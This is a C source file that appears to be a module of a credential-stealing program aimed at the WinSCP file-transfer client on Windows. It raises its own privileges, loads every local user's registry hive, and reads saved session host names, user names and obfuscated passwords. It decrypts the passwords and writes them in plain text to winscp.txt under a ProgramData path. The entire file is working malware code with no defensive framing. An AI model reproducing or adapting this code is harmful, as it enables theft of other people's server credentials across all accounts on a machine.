#include "main.h"


int decrypt_char(const char* hash, PCHAR* new_hash, size_t* size) {
	unsigned char hex_flag = 0xA3;
	char charset[17] = "0123456789ABCDEF";
	int unpack1, unpack2, result = 0;
	char* temp;
	size_t hash_len = 0;

	if (my_strlen(hash) > 0) {
		char hash_chr[2];

		my_memset(hash_chr, 0, 2);
		my_memcpy(hash_chr, hash, 1);
		temp = my_strstr(charset, hash_chr);
		if (!temp) {
			return result;
		}

		unpack1 = (int)(temp - charset);
		unpack1 <<= 4;
		my_memset(hash_chr, 0, 2);
		my_memcpy(hash_chr, hash+1, 1);
		temp = my_strstr(charset, hash_chr);
		if (!temp) return result;

		unpack2 = (int)(temp - charset);
		result = ~((unpack1 + unpack2) ^ hex_flag) & 0xff;
		hash_len = (my_strlen(hash) - 2) + 1;
		*size = hash_len;
		*new_hash = (char*)my_heapalloc(hash_len);
		if (!*new_hash) return 0;
		
		my_memcpy(*new_hash, hash + 2, hash_len);
	}
	
	return result;
}

char* get_winscp_creds(const char* username, const char* hostname, const char* hash) {
	unsigned char hex_flag = 0xFF;
	int flag, length, temp_result, ldel;
	char* new_hash = 0, *current_hash = 0, *result;
	size_t current_hash_len = 0, hash_len = 0;

	flag = decrypt_char(hash, &new_hash, &current_hash_len);
	current_hash = (char*)my_heapalloc(current_hash_len);
	my_memcpy(current_hash, new_hash, current_hash_len);
	if (new_hash) {
		my_heapfree(new_hash);
		new_hash = NULL;
	}

	if (flag == hex_flag) {
		decrypt_char(current_hash, &new_hash, &current_hash_len);
		if (current_hash) {
			my_heapfree(current_hash);
			current_hash = NULL;
		}

		current_hash = (char*)my_heapalloc(current_hash_len);
		my_memcpy(current_hash, new_hash, current_hash_len);
		if (new_hash) {
			my_heapfree(new_hash);
			new_hash = NULL;
		}

		length = decrypt_char(current_hash, &new_hash, &current_hash_len);
		if (current_hash) {
			my_heapfree(current_hash);
			current_hash = NULL;
		}

		current_hash = (char*)my_heapalloc(current_hash_len);
		my_memcpy(current_hash, new_hash, current_hash_len);
		if (new_hash) {
			my_heapfree(new_hash);
			new_hash = NULL;
		}
	}
	else {
		length = flag;
	}

	ldel = decrypt_char(current_hash, &new_hash, &current_hash_len) * 2;
	if (current_hash) {
		my_heapfree(current_hash);
		current_hash = NULL;
	}

	current_hash = (char*)my_heapalloc(current_hash_len);
	my_memcpy(current_hash, new_hash, current_hash_len);
	if (new_hash) {
		my_heapfree(new_hash);
		new_hash = NULL;
	}

	hash_len = (my_strlen(current_hash) - ldel) + 1;
	my_sprintf(current_hash, "%s", current_hash + ldel);
	current_hash_len = my_strlen(current_hash) + 1;
	result = (char*)my_heapalloc(260);

	for (int i = 0; i < length; i++) {
		temp_result = decrypt_char(current_hash, &new_hash, &current_hash_len);
		if (current_hash) {
			my_heapfree(current_hash);
			current_hash = NULL;
		}

		current_hash = (char*)my_heapalloc(current_hash_len);
		my_memcpy(current_hash, new_hash, current_hash_len);
		if (new_hash) {
			my_heapfree(new_hash);
			new_hash = NULL;
		}

		result[i] = temp_result;
	}

	if (flag == hex_flag) {
		char key[260];

		my_memcpy(key, username, my_strlen(username) + 1);
		my_strcat(key, hostname);
		my_sprintf(result, "%s", result + my_strlen(key));
	}

	if (current_hash) {
		my_heapfree(current_hash);
		current_hash = NULL;
	}

	return result;
}

int winscp_passwords() {
	HKEY key;
	HANDLE find = NULL;
	WIN32_FIND_DATA ffd;
	char userprofile_dir[60];
	int profile_size = 60;
	ULONG previousState;

	if (!GetProfilesDirectoryA(userprofile_dir, (DWORD*)&profile_size)) {
		return 0;
	}

	my_strcat(userprofile_dir, "\\*");
	find = FindFirstFileA(userprofile_dir, &ffd);
	if (find == INVALID_HANDLE_VALUE) {
		return 0;
	}

	RtlAdjustPrivilege(20, TRUE, FALSE, &previousState); //SeDebugPrivilege
	RtlAdjustPrivilege(17, TRUE, FALSE, &previousState); //SeBackupPrivilege
	RtlAdjustPrivilege(18, TRUE, FALSE, &previousState); //SeRestorePrivilege
	do {
		if (my_strcmp(ffd.cFileName, ".") == 0 || my_strcmp(ffd.cFileName, "..") == 0) {
			continue;
		}

		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			char ntuserdat_path[260], name[MAX_PATH], host[MAX_PATH], username[MAX_PATH], hash[MAX_PATH], subkey[MAX_PATH];
			int filename_len;
			LSTATUS result;
			HANDLE file_to_write;
			DWORD index = 0, size = MAX_PATH, bytes_written;
			char* password = NULL, *out, *pout;

			if (my_strcmp(ffd.cFileName, "Default") == 0) continue;

			filename_len = my_strlen(userprofile_dir);
			my_memcpy(ntuserdat_path, userprofile_dir, filename_len + 1);
			my_memcpy(ntuserdat_path + filename_len - 1, ffd.cFileName, strlen(ffd.cFileName) + 1);
			my_strcat(ntuserdat_path, "\\NTUSER.DAT");
			if (!PathFileExistsA(ntuserdat_path)) {
				continue;
			}

			DWORD loadkey = RegLoadKeyA(HKEY_USERS, ffd.cFileName, ntuserdat_path);
			if (loadkey == ERROR_SUCCESS) {
				my_sprintf(subkey, "%s\\Software\\Martin Prikryl\\WinSCP 2\\Sessions", ffd.cFileName);
			}
			else {
				BYTE mysid[SECURITY_MAX_SID_SIZE];
				PSID sid = (PSID)mysid;
				LPSTR rd [260];
				SID_NAME_USE peUse;
				DWORD cbsid = SECURITY_MAX_SID_SIZE, domainSize = 260;
				char* stringsid = NULL;

				if (LookupAccountNameA(NULL, ffd.cFileName, mysid, &cbsid, rd, &domainSize, &peUse)) {
					if (ConvertSidToStringSidA(sid, &stringsid)) {
						my_sprintf(subkey, "%s\\Software\\Martin Prikryl\\WinSCP 2\\Sessions", stringsid);
						LocalFree(stringsid);
					}
				}
				else continue;
			}
			
			if (RegOpenKeyExA(HKEY_USERS, subkey, 0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &key) == ERROR_SUCCESS) {
				if (result = RegEnumKeyExA(key, index, name, &size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
					DWORD hostsize = MAX_PATH, usersize = MAX_PATH, hashsize = MAX_PATH;

					out = (char*) my_heapalloc(1024 * 64); //64KB
					if (!out) continue;

					pout = out;
					do {
						my_memset(host, 0, MAX_PATH);
						my_memset(username, 0, MAX_PATH);
						RegGetValueA(key, name, "HostName", RRF_RT_REG_SZ, NULL, &host, &hostsize);
						RegGetValueA(key, name, "UserName", RRF_RT_REG_SZ, NULL, &username, &usersize);
						if (RegGetValueA(key, name, "Password", RRF_RT_REG_SZ, NULL, &hash, &hashsize) == ERROR_SUCCESS) {
							password = get_winscp_creds(host, username, hash);
						}

						size = MAX_PATH;
						result = RegEnumKeyExA(key, ++index, name, &size, NULL, NULL, NULL, NULL);
						
						my_sprintf(pout, "host: %s\r\nuser: %s\r\npass: %s\r\n\r\n", host, username, password);
						pout += my_strlen(pout);
						if (password) my_heapfree(password);
					} while (result != ERROR_NO_MORE_ITEMS);

					char path[260];
					my_sprintf(path, "%s\\%s", programdata_path, "winscp.txt");
					file_to_write = CreateFileA(path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if (file_to_write) {
						char user[60];

						my_sprintf(user, "==%s==\r\n\r\n", ffd.cFileName);
						WriteFile(file_to_write, user, my_strlen(user), &bytes_written, NULL);
						WriteFile(file_to_write, out, pout - out, &bytes_written, NULL);
						CloseHandle(file_to_write);
					}
					my_heapfree(out);
				}

				RegCloseKey(key);
				key = NULL;
			}

			if (loadkey == ERROR_SUCCESS) RegUnLoadKeyA(HKEY_USERS, ffd.cFileName);
		}
	} while (FindNextFile(find, &ffd));

	FindClose(find);
	return 1;
}